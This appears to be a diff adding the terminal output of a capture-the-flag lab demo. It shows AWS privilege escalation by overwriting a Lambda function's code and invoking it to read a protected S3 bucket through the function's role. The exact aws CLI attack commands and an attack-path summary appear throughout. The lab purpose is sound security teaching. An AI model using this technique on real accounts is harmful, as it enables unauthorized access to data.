@@ -1,0 +1,110 @@
+[0;32m========================================[0m
+[0;32mLambda UpdateFunctionCode to S3 Bucket Access Demo[0m
+[0;32m========================================[0m
+
+[1;33mStep 1: Retrieving scenario configuration from Terraform[0m
+Retrieved access key for: pl-prod-lambda-003-to-bucket-starting-user
+Access Key ID: AKIA2E4JP2...
+ReadOnly Key ID: AKIA2E4JP2...
+Target bucket: pl-prod-lambda-003-to-bucket-697683661464-66pzel
+Region: us-east-1
+[0;32m✓ Retrieved configuration from Terraform[0m
+
+[1;33mStep 2: Configuring AWS CLI with starting user credentials[0m
+Using region: us-east-1
+[2m[Attacker] $ aws sts get-caller-identity --query 'Arn' --output text[0m
+Current identity: arn:aws:iam::123456789012:user/pl-prod-lambda-003-to-bucket-starting-user
+[0;32m✓ Verified starting user identity[0m
+
+[1;33mStep 3: Getting account ID[0m
+[2m[ReadOnly] $ aws sts get-caller-identity --query 'Account' --output text[0m
+Account ID: 123456789012
+[0;32m✓ Retrieved account ID[0m
+
+[1;33mStep 4: Verifying we don't have S3 bucket access yet[0m
+Attempting to access target bucket (should fail)...
+[2m[Attacker] $ aws s3 ls s3://pl-prod-lambda-003-to-bucket-697683661464-66pzel/[0m
+[0;32m✓ Confirmed: Cannot access s3://pl-prod-lambda-003-to-bucket-697683661464-66pzel/ (as expected)[0m
+
+[1;33mStep 5: Getting target Lambda function details[0m
+Target Lambda function: pl-prod-lambda-003-to-bucket-target-lambda
+[2m[ReadOnly] $ aws lambda get-function --region us-east-1 --function-name pl-prod-lambda-003-to-bucket-target-lambda --output json[0m
+Handler: lambda_function.lambda_handler
+Runtime: python3.12
+Execution Role: arn:aws:iam::123456789012:role/pl-prod-lambda-003-to-bucket-target-role
+[0;32m✓ Retrieved function details[0m
+
+[1;33mStep 6: Backing up original Lambda function code[0m
+Downloading original code for restoration after demo...
+[0;32m✓ Original code backed up to /tmp/original_lambda_backup.zip[0m
+
+[1;33mStep 7: Creating malicious Lambda function code[0m
+Creating Python code that will read flag.txt from the target S3 bucket...
+[0;32m✓ Malicious code created[0m
+
+[1;33mStep 8: Packaging malicious code[0m
+[0;32m✓ Malicious code packaged[0m
+
+[1;33mStep 9: Updating Lambda function code with malicious payload[0m
+This is the privilege escalation vector - updating function code...
+Function: pl-prod-lambda-003-to-bucket-target-lambda
+
+[0;36m[Attacker] $ aws lambda update-function-code --region us-east-1 --function-name pl-prod-lambda-003-to-bucket-target-lambda --zip-file fileb:///tmp/lambda_function.zip --output json[0m
+Update Status: InProgress
+[0;32m✓ Successfully updated Lambda function code![0m
+
+[1;33mStep 10: Waiting for Lambda to process code update[0m
+Allowing time for Lambda to deploy the new code...
+[0;32m✓ Lambda function updated[0m
+
+[1;33mStep 11: Invoking Lambda function to read target S3 bucket[0m
+Invoking function: pl-prod-lambda-003-to-bucket-target-lambda
+
+[0;36m[Attacker] $ aws lambda invoke --region us-east-1 --function-name pl-prod-lambda-003-to-bucket-target-lambda --payload '{}' /tmp/response.json --output json[0m
+[0;32m✓ Lambda function invoked successfully[0m
+
+Response from Lambda function:
+{
+  "statusCode": 200,
+  "body": "{\"flag\": \"flag{lambda_003_bucket_accessed}\", \"message\": \"Successfully read sensitive S3 bucket: pl-prod-lambda-003-to-bucket-697683661464-66pzel\", \"bucket\": \"pl-prod-lambda-003-to-bucket-697683661464-66pzel\"}"
+}
+
+[0;32m✓ BUCKET ACCESS CONFIRMED via Lambda execution role[0m
+
+[1;33mStep 12: Capturing CTF flag from Lambda response[0m
+
+[0;36m[Attacker] $ aws lambda invoke --region us-east-1 --function-name pl-prod-lambda-003-to-bucket-target-lambda --payload '{}' /tmp/response.json && cat /tmp/response.json | jq -r '.body' | jq -r '.flag'[0m
+[0;32m✓ Flag captured: flag{lambda_003_bucket_accessed}[0m
+
+
+[0;32m========================================[0m
+[0;32m✅ CTF FLAG CAPTURED![0m
+[0;32m========================================[0m
+
+[1;33mAttack Summary:[0m
+1. Started as: pl-prod-lambda-003-to-bucket-starting-user (with lambda:UpdateFunctionCode + lambda:InvokeFunction)
+2. Discovered existing Lambda function: pl-prod-lambda-003-to-bucket-target-lambda
+3. Lambda function has privileged execution role: pl-prod-lambda-003-to-bucket-target-role
+4. Updated Lambda function code with payload that reads from S3 (bucket injected via env var)
+5. Invoked Lambda function to read flag.txt from s3://pl-prod-lambda-003-to-bucket-697683661464-66pzel/
+6. CTF flag extracted from Lambda response: flag{lambda_003_bucket_accessed}
+
+[1;33mAttack Path:[0m
+  pl-prod-lambda-003-to-bucket-starting-user → (lambda:UpdateFunctionCode) → pl-prod-lambda-003-to-bucket-target-lambda
+  → (lambda:InvokeFunction) → Executes with pl-prod-lambda-003-to-bucket-target-role
+  → (s3:GetObject flag.txt) → CTF Flag
+
+[1;33mAttack Commands:[0m
+  [0;36m$ aws lambda update-function-code --region us-east-1 --function-name pl-prod-lambda-003-to-bucket-target-lambda --zip-file fileb:///tmp/lambda_function.zip --output json[0m
+  [0;36m$ aws lambda invoke --region us-east-1 --function-name pl-prod-lambda-003-to-bucket-target-lambda --payload '{}' /tmp/response.json --output json[0m
+  [0;36m$ aws lambda invoke --region us-east-1 --function-name pl-prod-lambda-003-to-bucket-target-lambda --payload '{}' /tmp/response.json && cat /tmp/response.json | jq -r '.body' | jq -r '.flag'[0m
+
+[1;33mAttack Artifacts:[0m
+- Modified Lambda function: pl-prod-lambda-003-to-bucket-target-lambda (code replaced with malicious payload)
+- Backup of original code: /tmp/original_lambda_backup.zip
+
+[0;31m⚠ Warning: The Lambda function code has been modified[0m
+
+[1;33mTo clean up and restore the original state:[0m
+  ./cleanup_attack.sh or use the plabs TUI/CLI
+
